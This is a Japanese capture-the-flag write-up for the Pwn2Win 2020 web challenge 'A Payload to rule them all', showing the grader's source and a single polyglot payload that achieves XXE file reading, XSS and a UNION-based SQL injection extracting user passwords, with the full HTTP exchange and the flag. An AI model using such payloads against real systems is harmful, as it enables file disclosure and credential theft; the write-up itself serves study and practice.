# A Payload to rule them all [web]

written by Ark

- Score: 171
- Solves: 65

XXE、XSS、SQLiを同じペイロードで成功させる問題

## 問題概要

http://payload.pwn2.win/source からソースコードが見れる。

```fish
$ http -v --form POST http://payload.pwn2.win/ payload="hogehoge"
```

のようなPOSTをすることで、`hogehoge`によるXXE、XSS、SQLiの攻撃が成功するかをチェックし、すべて成功すればflagを返すような実装になっている。

XXE、XSS、SQLiのチェック部分は次のような感じ。

**test_xxe**

```javascript
function test_xxe(payload) {
  try {
    var my_secret = Math.random().toString(36).substring(2);
    fs.writeFileSync("/home/gnx/script/xxe_secret", my_secret)
    var doc = libxml.parseXml(payload, { noent: true, nonet: true })
    return doc.toString().includes(my_secret)
  } catch(e) {
    return false
  }
}
```

`/home/gnx/script/xxe_secret`に乱数が書き込まれるので、XML内にこの乱数値が含まれるようにすれば良い。

**test_xss**

```javascript
async function test_xss(payload) {
  try {
    const browser = await puppeteer.launch({
      // 省略
    })
    const page = await browser.newPage()
    page.setDefaultNavigationTimeout(1000);
    payload = sanitizeHtml(payload, { allowedTags: [] })
    await page.goto(`data:text/html,<script>${payload}</script>`)
    const check = await page.evaluate("( typeof xss != 'undefined' ? true : false )") // vlw herrera
    await browser.close()
    return check
  } catch (error) {
    console.error(error)
  }
}
```

XSSで変数`xss`に何らかの値を突っ込めば良いことがわかる。ただし、XSSの前にペイロードはサニタイズされる。サニタイズには[libxmljs](https://github.com/libxmljs/libxmljs)が使われている。

**test_sqli**

```javascript
async function test_sqli(payload) {
  var connection = mysql.createConnection({
    // 省略
  })
  const query = util.promisify(connection.query).bind(connection)
  connection.connect()
  const users = await query("SELECT * from users")
  try {
    const sqli = await query(`SELECT * from posts where id='${payload}'`)
    await connection.end()
    return JSON.stringify(sqli).includes(users[0]["password"])
  } catch(e) {
    return false
  }
}
```

SQLiで`users`の中の`password`の値を引っこ抜ければ良い。

## 解法

いい感じにコメントアウトを組み合わせてパズルを解くだけ。最終的に次のようになった。

```
<!--aa' OR 1=1 UNION ALL SELECT NULL, password, NULL FROM users # */--><!DOCTYPE data [<!ENTITY dummy ">window.xss = 1;/*"><!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">]><data>&xxe;*/</data>
```

それぞれ次のように動作する：

### XXE

XMLにとってコメントアウトになる部分を省くと

```xml
<!DOCTYPE data [
    <!ENTITY dummy ">window.xss = 1;/*">
    <!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">
]>
<data>&xxe;*/</data>
```

になる（読みやすいように改行しています）。`file:///home/gnx/script/xxe_secret`への外部実体参照を行っている。

### XSS

`test_xss`では最初にサニタイズを行っている。サニタイズ後のコードは

```javascript
window.xss = 1;/*"&gt;]&gt;&amp;xxe;*/
```

となり、`xss`に値が入るのでOK。

### SQLi

これがinjectionされるとSQL文は

```mysql
SELECT * from posts where id='<!--aa' OR 1=1 UNION ALL SELECT NULL, password, NULL FROM users # */--><!DOCTYPE data [<!ENTITY dummy ">window.xss = 1;/*"><!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">]><data>&xxe;*/</data>'
```

になる。UNIONで結合するときにカラム数がわからないので`NULL`で微調整した。

### 実行結果

[httpie](https://httpie.org/)でPOSTしたらこうなった。


```fish
$ http -v --form POST http://payload.pwn2.win/ payload="<!--aa' OR 1=1 UNION ALL SELECT NULL, password, NULL FROM users # */--><!DOCTYPE data [<!ENTITY dummy \">window.xss = 1;/*\"><!ENTITY xxe SYSTEM \"file:///home/gnx/script/xxe_secret\">]><data>&xxe;*/</data>"
POST / HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 302
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: payload.pwn2.win
User-Agent: HTTPie/0.9.8

payload=%3C%21--aa%27+OR+1%3D1+UNION+ALL+SELECT+NULL%2C+password%2C+NULL+FROM+users+%23+%2A%2F--%3E%3C%21DOCTYPE+data+%5B%3C%21ENTITY+dummy+%22%3Ewindow.xss+%3D+1%3B%2F%2A%22%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fhome%2Fgnx%2Fscript%2Fxxe_secret%22%3E%5D%3E%3Cdata%3E%26xxe%3B%2A%2F%3C%2Fdata%3E

HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 53
Content-Type: text/html; charset=utf-8
Date: Sat, 30 May 2020 21:41:49 GMT
ETag: W/"35-sI94sUxFxcBb5euZ/qdPcFO4/0Q"
X-Powered-By: Express

CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}
```

## フラグ

`CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}`

## 感想

完全にパズルだった。
